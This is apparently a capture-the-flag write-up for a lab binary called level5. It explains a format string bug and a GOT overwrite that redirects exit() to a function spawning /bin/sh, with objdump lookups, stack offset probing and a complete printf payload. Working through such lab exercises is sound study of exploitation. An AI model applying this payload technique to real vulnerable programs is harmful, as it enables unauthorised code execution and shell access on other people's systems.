# Code execution Redirect

We have a function n() calling a vulnerable printf and a function o() calling a /bin/sh.

The idea is to redirect the code execution do the function o().

We can't overwrite return address of n function because it exit at the end of the function

```c
void n(void)
{
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  printf(local_20c);
  exit(1); //here
}
```

We’ll use a trick called GOT Overwrite.

## Theory

Basically, when the program is executed, the GOT (Global Offset Table) is initialized for every external functions (like libc functions). By doing so, the executable will cache the memory address in the GOT, so that it doesn’t have to ask libc each time an external function is called.

The goal here will be to overwrite the address of exit() in the GOT with the address of o(). There are 4 steps here :

- Find the address of o()
- Find the address of exit() in GOT
- Find the offset of our string on the stack
- Write the proper exploit string

```bash
iobjdump -R ./level5 | grep exit                                                                          (main✱) 
08049838 R_386_JUMP_SLOT   exit@GLIBC_2.0

objdump -t ./level5 | grep o
080484a4 g     F .text	0000001e              o
```

Both addresses are find, now lets find the offset of the buffer:

```bash
./level5                                                                                                 (main✱) 
AAAA%x.%x.%x.%x.%x.
AAAA200.f7e26620.0.41414141.252e7825.

./level5                                                                                                 (main✱) 
AAAA%4$x
AAAA41414141
```

Offset of the buffer in the stack is `%4$x`. Lets try, write 4 byte in exit func:

```c
gef➤  r < <(python3 -c 'import sys; sys.stdout.buffer.write(b"\x38\x98\x04\x08" + b"%4$n")')
Program received signal SIGSEGV, Segmentation fault.
0x00000004 in ?? ()
```

Nice it seg at address 4, it mean we well overwrite !

## Payload

### Write larger data:

```py
0x0804 = 2052 (in decimal) -> 0x08049838 + 2 =  0x0804983a
0x84a4 = 33956 (in decimal) -> 0x08049838
```

Padding :

```py
2052 - 8 = 2044
33956 - 2052 = 31904
```

Payload : 

cat <(python2.7 -c 'import sys; sys.stdout.write(b"\x38\x98\x04\x08" + b"\x3a\x98\x04\x08" + b"%2044x" + b"%5$hn" + b"%31904x" + b"%4$hn")') - | ./level5